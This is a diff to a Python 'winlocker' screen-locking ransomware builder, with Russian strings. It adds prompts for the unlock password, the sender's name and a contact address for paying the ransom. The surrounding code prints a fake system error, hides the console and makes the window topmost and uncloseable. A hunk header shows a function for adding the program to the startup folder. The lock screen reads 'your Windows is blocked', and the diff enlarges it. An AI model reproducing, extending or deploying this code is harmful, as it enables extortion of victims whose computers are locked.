@@ -15,6 +15,8 @@ print(r"""
 
 """)
 parol = input("введите пароль от винлокера: ")
+name = input("введите от кого будет винлокер: ")
+otkup = input("введите куда написать для откупа: ")
 
 import tkinter as tk
 import os
@@ -39,7 +41,7 @@ def add_to_startup_folder():
 
 print("00x(2)00003 system error")
 
-time.sleep(1.5)
+time.sleep(0.5)
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -62,11 +64,11 @@ root.attributes("-topmost", True)
 
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-label = tk.Label(root, text="ваш виндовс заблокирован k9gy", font=("Arial", 20))
+label = tk.Label(root, text="ваш виндовс заблокирован k9gy", foreground="white", background="blue", font=("Arial", 35))
 label.pack(pady=20)
 
 
-entry = tk.Entry(root, width=30, font=("Arial", 12))
+entry = tk.Entry(root, width=30, font=("Arial", 25))
 entry.pack(pady=10)
 
 
